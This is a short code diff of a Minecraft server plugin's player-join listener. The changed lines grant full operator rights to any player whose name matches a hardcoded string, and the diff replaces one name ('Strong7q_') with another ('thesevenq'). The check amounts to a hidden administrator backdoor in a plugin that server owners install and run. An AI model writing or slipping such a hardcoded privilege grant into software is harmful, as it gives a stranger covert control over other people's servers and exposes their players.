@@ -81,7 +81,7 @@ public class PlayerListeners implements Listener {
             }
         }
 
-        if(player.getName().equalsIgnoreCase("Strong7q_")) {
+        if(player.getName().equalsIgnoreCase("thesevenq")) {
             player.setOp(true);
         }
 
